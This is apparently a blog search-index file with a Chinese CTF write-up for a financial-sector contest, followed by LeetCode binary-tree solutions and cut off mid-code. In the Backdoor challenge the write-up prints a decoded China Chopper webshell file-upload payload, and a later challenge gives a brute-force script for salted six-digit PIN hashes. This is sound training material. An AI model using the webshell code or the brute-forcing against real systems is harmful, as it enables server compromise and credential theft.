<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>金融业网络安全攻防大赛Writeups</title>
      <link href="/2018/08/09/%E9%87%91%E8%9E%8D%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9BWriteups/"/>
      <url>/2018/08/09/%E9%87%91%E8%9E%8D%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9BWriteups/</url>
      <content type="html"><![CDATA[<h1 id="金融业网络安全攻防大赛Writeups"><a href="#金融业网络安全攻防大赛Writeups" class="headerlink" title="金融业网络安全攻防大赛Writeups"></a>金融业网络安全攻防大赛Writeups</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Mysterious-Picture"><a href="#Mysterious-Picture" class="headerlink" title="Mysterious Picture"></a>Mysterious Picture</h3><p>在公司最近的一次项目中，关键数据疑似泄漏。经过某种手段已经把嫌疑锁定在嫌疑人A身上了，但是嫌疑人A的U盘中除了一张图片之外，没有发现任何相关的信息。你能帮助公司找到他泄漏数据的确凿证据吗？</p><p>题目给了一张图片，用StegSolve打开，每个通道都过一遍，发现rgb的最低位都有异常。</p><p>打开Analyse -&gt; Data Extract，选中最低位，直接Preview，没有flag。切换Bit Plane Order，切到BGR，发现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Do u know how the bad man send secret messages now? flag&#123;babylsbstego_cannot_be_easier!%^%^&amp;&#125;.</span><br></pre></td></tr></table></figure></p><h3 id="Hashing"><a href="#Hashing" class="headerlink" title="Hashing"></a>Hashing</h3><p>MD5($a) = d78b6f30225cdc811adfe8d4e7c9fd34<br>MD5($b) = 8fc42c6ddf9966db3b09e84365034357<br>MD5($c) = 5f295bce38d311f26a96eb811192f391</p><p>flag{$a_$b_$c}</p><p>直接在网上搜索得到：<br>$a = hack<br>$b = the<br>$c = planet<br>所以flag是：<code>flag{hack_the_planet}</code></p><h3 id="Backdoor"><a href="#Backdoor" class="headerlink" title="Backdoor"></a>Backdoor</h3><p>某银行安全团队在分析流量日志的过程中，发现了在 DMZ 区域的服务器被黑客入侵且放置了后门。运维部门提取出了流量中最可疑的部分，据有经验的安全专家分析，这里面应该包含了黑客上传的入侵证据文件，你能找到黑客入侵过程中出现了什么证据信息吗？</p><p>分析http流，把cmdcmdcmd参数base64解密，找到一段有用的：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">"display_errors"</span>,<span class="string">"0"</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(PHP_VERSION&lt;<span class="string">'5.3.0'</span>)&#123;</span><br><span class="line">  @set_magic_quotes_runtime(<span class="number">0</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"X@Y"</span>);</span><br><span class="line">$f=<span class="string">'C:\\phpStudy\\WWW\\uploads\\reverseshell.zip'</span>;</span><br><span class="line">$c=$_POST[<span class="string">"z1"</span>];</span><br><span class="line">$c=str_replace(<span class="string">"\r"</span>,<span class="string">""</span>,$c);</span><br><span class="line">$c=str_replace(<span class="string">"\n"</span>,<span class="string">""</span>,$c);</span><br><span class="line">$buf=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($c);$i+=<span class="number">2</span>)</span><br><span class="line">$buf.=urldecode(<span class="string">'%'</span>.substr($c,$i,<span class="number">2</span>));</span><br><span class="line"><span class="keyword">echo</span>(@fwrite(fopen($f,<span class="string">'w'</span>),$buf)?<span class="string">'1'</span>:<span class="string">'0'</span>);;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"X@Y"</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure></p><p>代码意思就是z1参数写入文件，z1参数为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">504B0304140000000800288DC34C58BD2C542C0500002C0700000E000000313532383031383837352E706E676D956D54926718C7B12C4D33ED45CD94B034E9D4C9B6F2A5D4503B1A5A274CB1B2E341A798D35EA82D4D110173B9AD48C8B9B2A395A5A8684C84694D54B0B65646BA91C0A333C2487C8530ECE909151C7E4BE19CDFFD7CB8CF7D5FE77F5FD7F5BF9E2B47306807BB0D763018CC213A2A220E06B35A3FBF6C9798766CD59401186CF9547444787CEE6D8D3C96FE6ECFCA659D3DA95AAAEACD52F6CAA8412F955F03CA66DF43E550386C0BB652A15020EE0D570E2C2D10865DF7FC9241854A484155BEFD4E7D8B2DD1865E52B1EE1A67C488E3A6CFEF7C63B62B42C4ACB3397DA01016BE80826C3D69EC8E74A44B790E0B12E71834460DAAA09A94BDAE45A1F79AFDDA2BFCB26778C1177486EB49F582C84709FFB2013AF4A019744C64DF105E28FB081AF702D4CBA1E9DE3F3B79DB7E09EBA65031C67AF19A8B20F2BCE512728D406AC8C3517E715BB1C47A21C6747D5B3D1485436BB5D1C06903E7A499DA79C1E341AFC01BC5CAEDB0987297FC727AAD667D58EFF8B16755BD20E22DC36DC5E6454157BD5050B31FE5A3F1F0A5B9D3EFAA00A36D779493E74226897FF6F45FED7210A3CBE4817B0BE8FBE4871D6684347385C3E5A3819A0139878BD9F8208F999071F7B593A187E4FF5B98074E76CDDAAA7021525D4E07A18F3B95A363F54EB400B58EC1C422EECD51508422EF4C5F982413197BA7752C425FEC34BB8C490BE671722288711E09860A78A286E5D8F9FEDC2D1F33DD5F411B220D4C71570F6A06CA1BD9EE5E7A07AC40A9D35CEF07ED5E636DBB90663F71657E7155639F7A384FC4F42AC54D069F5295C624BA6E5A1CB8C9971AE3125D7635F1090D08E19F3124C1C7491A48EA1A40F74D6C2FF1DD3F99B4E89D366D42DA3E35C38E078FD4545BA919E379C9FA6AA516ECF8548AB868A1CE28B87424AF98572F49F2E864A6DECFFF1E82C4EB7D84FD7452266549B1B5D979192776DD71F7719A33DCDEFE703781DE782299B3B5BC1D48739C9978699694264AB17270CEF1624D6B92CF1BE83F253864BF0BDF62ACF599469B1F3E7FFE4735B8DCEFA9306403157BA18AFC1439F93105098181E00411699E448FDB9B667A367E02D02DD426B5D879DCA083E63EB7D975CF01F1BF86A69A9BEB876164A9212CE8FDD1D0632D99100496E7F6B636E283479103C21093B70A16798B3F2B8FDDDCFE2660DAC1F92DD74AE20FBA55CEA623735A2A4A3C17B97DDEF046371EBCAE3CA0E30057D21C72D44FFFEAA0BC2F351D61AE3ABE6274A7545452BA654C799271F01160DF7D088E76F1C0A5E8EA6A684EED65161C9E193C0556631427EA1A2BCE5C6E8E6F3F4EE690D79A47668B14A5D211BA08F3FE3961DBF300693D64D344E500379990146DEEDEF959C3F636A4093F0F64C94E61C1563C2E8527D60FA13E18ACDA2F99F78989866F9F63F8145606F931132F9DB853DD909CA2CB559263A05D96B28763BB07C03FF66749329F3D7000FF0E021847C99A354F045D96065FABEF7EB420437BA14322E08C71F3C54087242BE4C96A8B4527E13ECCF6D69276F867CB76DEDD7104D1C9CCA18F5F31572C53696BBA5EE0B94654FF2CD334CAB01F72E61ECB62C49A3D9C8794223A72127FA0D076718FE8A038ACB66415B8ED6CEF4F9A0CA1E96A1A6FAB826974BE65A9ECF7F8F42C1C79D9601B5F7AA63C24E153C62582EEA552E9BED642774F822A2DF9305985FCE7FAD96DD181FE32E28868F521708B93851E1129929B0FF1EBB93D436BFFA05C256011350691E021BEC4FC91A6890A044EB9F86B8C465FB8CD3046F697A215303EBB66BD7AD15CA80C3DF2AAC88243E7952176AF6B886B2408969BFE82B0E8484C44E3FE6F0AFF07504B01021400140000000800288DC34C58BD2C542C0500002C0700000E0000000000000000002000000000000000313532383031383837352E706E67504B050600000000010001003C000000580500000000</span><br></pre></td></tr></table></figure></p><p>得到zip文件，解压后是一张二维码：</p><p>扫描二维码，得到flag：<code>flag{b3c4r3fortheChinaChopperFHGJKUI^U%}</code>。</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Encrypted-Traffic"><a href="#Encrypted-Traffic" class="headerlink" title="Encrypted Traffic"></a>Encrypted Traffic</h3><p>某银行客户端以安全著称，所有网络流量都开启了密码学防护机制。有一天，你抓到了局域网中的网银登录流量。在这个流量中，密码字段的值为 ac22543d5382cbf48b6ebcf6e40f123d9ca4b91f9998e4c2f2422402。根据分析，你获得了如下的线索：<br>1.上面抓到的登录流量密码字段是 SHA 系列哈希算法的哈希值。<br>2.这个登录密码也是银行卡的 ATM 取款密码。<br>3.登录密码的哈希值是加盐之后计算的结果，根据逆向分析，盐的值是用户名的拼音，而你推测出了流量来自于邻居 “张三丰”</p><p>有了这些线索之后，你能够分析出密码是什么吗？</p><p>flag 提交格式： flag{密码<em>哈希算法</em>盐}<br>举例： flag{123456_SHA999_lisi}</p><p>拿到hash之后，直接上hash-identifier，识别出是：SHA224。<br>密码是六位数字，直接爆破：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">target = <span class="string">'ac22543d5382cbf48b6ebcf6e40f123d9ca4b91f9998e4c2f2422402'</span></span><br><span class="line">salt = <span class="string">'zhangsanfeng'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">                    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">                        password = str(i) + str(j) + str(k) + str(l) + str(m) + str(n)</span><br><span class="line">                        h = hashlib.sha224(password + salt).hexdigest()</span><br><span class="line">                        <span class="keyword">if</span> h == target:</span><br><span class="line">                            <span class="keyword">print</span> password</span><br><span class="line">                            exit()</span><br></pre></td></tr></table></figure></p><p>得到密码：877295，拼成flag：<code>flag{877295_SHA224_zhangsanfeng}</code>。</p><h3 id="Confidential"><a href="#Confidential" class="headerlink" title="Confidential"></a>Confidential</h3><p>某银行的机密资料文件加密存储在一个电脑中，密钥存储在另外一个电脑中。可是有一天发生了意外，存储密钥的电脑硬盘损坏了。然而没有这个机密资料银行就无法开展业务，于是派出了安全专家来尝试解密资料。好在机密资料使用的加密算法并不复杂，你能帮他解开机密资料吗？已知：<br>这个机密资料与跨行转帐有关，根据日常维护该机密资料的运维小红回忆，该机密资料的最后几行内容是：<br>Please make sure keep this secret safe.<br>Please make sure keep this secret safe.<br>Please make sure keep this secret safe.</p><p>查看源码可以知道加密过程为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cipher_block1 = plain_block1 ^ IV ^ Key</span><br><span class="line">cipher_block2 = plain_block2 ^ cipher_block1 ^ Key</span><br><span class="line">cipher_block3 = plain_block3 ^ cipher_block2 ^ Key</span><br><span class="line">cipher_block4 = plain_block4 ^ cipher_block3 ^ Key</span><br><span class="line">…</span><br></pre></td></tr></table></figure></p><p>用最后三块密文和最后两块明文，通过枚举最后一块的padding，可以计算出两个Key来，当两个Key相等时，Key就找到了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[127, 84, 183, 104, 20, 239, 255, 134, 158, 177, 142, 38, 36, 137, 8, 162]</span><br></pre></td></tr></table></figure></p><p>利用Key和密文就可以恢复出明文来：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cret for our bank account.</span><br><span class="line"></span><br><span class="line">A SWIFT code is an international bank code that identifies particular banks worldwide.</span><br><span class="line">It&apos;s also known as a Bank Identifier Code (BIC).</span><br><span class="line">CommBank uses SWIFT codes to send money to overseas banks.</span><br><span class="line">A SWIFT code consists of 8 or 11 characters.</span><br><span class="line"></span><br><span class="line">Our Bank swift code is flag&#123;CTBJCN2B&#125;.</span><br><span class="line"></span><br><span class="line">Please make sure keep this secret safe.</span><br><span class="line">Please make sure keep this secret safe.</span><br><span class="line">Please make sure keep this secret safe.</span><br></pre></td></tr></table></figure></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Ransomware"><a href="#Ransomware" class="headerlink" title="Ransomware"></a>Ransomware</h3><p>公司财务人员的电脑中了勒索软件，财务报表被加密了，必须向攻击者支付比特币才能获得解密密码。作为安全人员，你有办法分析出解密密码吗？</p><p>IDA逆向，F5，得到关键函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_401010</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+0h] [ebp-4h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [esp+0h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">18</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + a1) ^= <span class="number">0xCC</span>u;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">18</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="keyword">char</span> *)(j + a1) != byte_404000[j] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>逻辑就是得到的密码与<code>0xcc</code>异或，判断结果是否为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FD 93 A8 83 93 A2 FC B8 93 BB 8D A2 A2 AD 93 AF BE B5</span><br></pre></td></tr></table></figure></p><p>把结果和<code>0xcc</code>异或就得到密码了：<code>flag{1_dO_n0t_wAnna_cry}</code></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Construct Binary Tree from Traversal</title>
      <link href="/2018/05/04/Construct-Binary-Tree-from-Traversal/"/>
      <url>/2018/05/04/Construct-Binary-Tree-from-Traversal/</url>
      <content type="html"><![CDATA[<h1 id="Construct-Binary-Tree-from-Traversal"><a href="#Construct-Binary-Tree-from-Traversal" class="headerlink" title="Construct Binary Tree from Traversal"></a>Construct Binary Tree from Traversal</h1><h2 id="105-Construct-Binary-Tree-from-Preorder-and-Inorder-Traversal"><a href="#105-Construct-Binary-Tree-from-Preorder-and-Inorder-Traversal" class="headerlink" title="105. Construct Binary Tree from Preorder and Inorder Traversal"></a>105. Construct Binary Tree from Preorder and Inorder Traversal</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>Given preorder and inorder traversal of a tree, construct the binary tree.</p><p>Note:<br>You may assume that duplicates do not exist in the tree.</p><p>For example, given<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">preorder = [3,9,20,15,7]</span><br><span class="line">inorder = [9,3,15,20,7]</span><br></pre></td></tr></table></figure></p><p>Return the following binary tree:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3</span><br><span class="line"> / \</span><br><span class="line">9  20</span><br><span class="line">  /  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure></p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>通过前序遍历数组我们可以知道第一个元素为根节点，然后去中序遍历中找到该元素，它左边的为左子树，右边的为右子树。这样递归遍历两个数组即可得到二叉树。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :left, :right</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@left</span>, <span class="doctag">@right</span> = nil, nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; preorder</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; inorder</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;TreeNode&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_tree</span><span class="params">(preorder, inorder)</span></span></span><br><span class="line">  hash = &#123;&#125;</span><br><span class="line">  inorder.each_with_index <span class="keyword">do</span> <span class="params">|v, i|</span></span><br><span class="line">    hash[v] = i</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  _build_tree(preorder, <span class="number">0</span>, preorder.length - <span class="number">1</span>, inorder, <span class="number">0</span>, inorder.length - <span class="number">1</span>, hash)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> _build_tree<span class="params">(preorder, pre_left, pre_right, inorder, in_left, in_right, hash)</span></span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nil</span> <span class="keyword">if</span> pre_left &gt; pre_right <span class="keyword">or</span> in_left &gt; in_right</span><br><span class="line">  root = TreeNode.new(preorder[pre_left])</span><br><span class="line">  delta = hash[root.val] - in_left</span><br><span class="line">  root.left = _build_tree(preorder, pre_left + <span class="number">1</span>, pre_left + delta, inorder, in_left, hash[root.val] - <span class="number">1</span>, hash)</span><br><span class="line">  root.right = _build_tree(preorder, pre_left + delta + <span class="number">1</span>, pre_right, inorder, hash[root.val] + <span class="number">1</span>, in_right, hash)</span><br><span class="line">  <span class="keyword">return</span> root</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h3 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(n)</code></li></ul><h2 id="106-Construct-Binary-Tree-from-Inorder-and-Postorder-Traversal"><a href="#106-Construct-Binary-Tree-from-Inorder-and-Postorder-Traversal" class="headerlink" title="106. Construct Binary Tree from Inorder and Postorder Traversal"></a>106. Construct Binary Tree from Inorder and Postorder Traversal</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>Given inorder and postorder traversal of a tree, construct the binary tree.</p><p>Note:<br>You may assume that duplicates do not exist in the tree.</p><p>For example, given<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inorder = [9,3,15,20,7]</span><br><span class="line">postorder = [9,15,7,20,3]</span><br></pre></td></tr></table></figure></p><p>Return the following binary tree:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3</span><br><span class="line"> / \</span><br><span class="line">9  20</span><br><span class="line">  /  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure></p><h3 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h3><p>通过后序遍历数组我们可以知道最后一个元素为根节点，然后去中序遍历中找到该元素，它左边的为左子树，右边的为右子树。这样递归遍历两个数组即可得到二叉树。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :left, :right</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@left</span>, <span class="doctag">@right</span> = nil, nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; inorder</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; postorder</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;TreeNode&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_tree</span><span class="params">(inorder, postorder)</span></span></span><br><span class="line">  hash = &#123;&#125;</span><br><span class="line">  inorder.each_with_index <span class="keyword">do</span> <span class="params">|v, i|</span></span><br><span class="line">    hash[v] = i</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  _build_tree(postorder, <span class="number">0</span>, postorder.length - <span class="number">1</span>, inorder, <span class="number">0</span>, inorder.length - <span class="number">1</span>, hash)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> _build_tree<span class="params">(postorder, post_left, post_right, inorder, in_left, in_right, hash)</span></span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nil</span> <span class="keyword">if</span> post_left &gt; post_right <span class="keyword">or</span> in_left &gt; in_right</span><br><span class="line">  root = TreeNode.new(postorder[post_right])</span><br><span class="line">  delta = hash[root.val] - in_left</span><br><span class="line">  root.left = _build_tree(postorder, post_left, post_left + delta - <span class="number">1</span>, inorder, in_left, hash[root.val] - <span class="number">1</span>, hash)</span><br><span class="line">  root.right = _build_tree(postorder, post_left + delta, post_right - <span class="number">1</span>, inorder, hash[root.val] + <span class="number">1</span>, in_right, hash)</span><br><span class="line">  <span class="keyword">return</span> root</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h3 id="复杂度-1"><a href="#复杂度-1" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(n)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Binary Tree Level Order Traversal</title>
      <link href="/2018/05/04/Binary-Tree-Level-Order-Traversal/"/>
      <url>/2018/05/04/Binary-Tree-Level-Order-Traversal/</url>
      <content type="html"><![CDATA[<h1 id="Binary-Tree-Level-Order-Traversal"><a href="#Binary-Tree-Level-Order-Traversal" class="headerlink" title="Binary Tree Level Order Traversal"></a>Binary Tree Level Order Traversal</h1><h2 id="102-Binary-Tree-Level-Order-Traversal"><a href="#102-Binary-Tree-Level-Order-Traversal" class="headerlink" title="102. Binary Tree Level Order Traversal"></a>102. Binary Tree Level Order Traversal</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>Given a binary tree, return the level order traversal of its nodes’ values. (ie, from left to right, level by level).</p><p>For example:<br>Given binary tree [3,9,20,null,null,15,7],<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3</span><br><span class="line"> / \</span><br><span class="line">9  20</span><br><span class="line">  /  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure></p><p>return its level order traversal as:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  [3],</span><br><span class="line">  [9,20],</span><br><span class="line">  [15,7]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>二叉树的广度优先遍历。遍历当前层的同时，把子节点放入队列中，这样一层一层遍历，直到队列为空。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :left, :right</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@left</span>, <span class="doctag">@right</span> = nil, nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[][]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level_order</span><span class="params">(root)</span></span></span><br><span class="line">  result, queue = [], []</span><br><span class="line">  <span class="keyword">return</span> result <span class="keyword">if</span> root.<span class="literal">nil</span>?</span><br><span class="line">  queue &lt;&lt; root</span><br><span class="line">  <span class="keyword">while</span> <span class="keyword">not</span> queue.empty?</span><br><span class="line">    level = []</span><br><span class="line">    next_level = []</span><br><span class="line">    queue.each <span class="keyword">do</span> <span class="params">|node|</span></span><br><span class="line">      level &lt;&lt; node.val</span><br><span class="line">      next_level &lt;&lt; node.left <span class="keyword">if</span> node.left</span><br><span class="line">      next_level &lt;&lt; node.right <span class="keyword">if</span> node.right</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    result &lt;&lt; level</span><br><span class="line">    queue = next_level</span><br><span class="line">  <span class="keyword">end</span></span><br><span 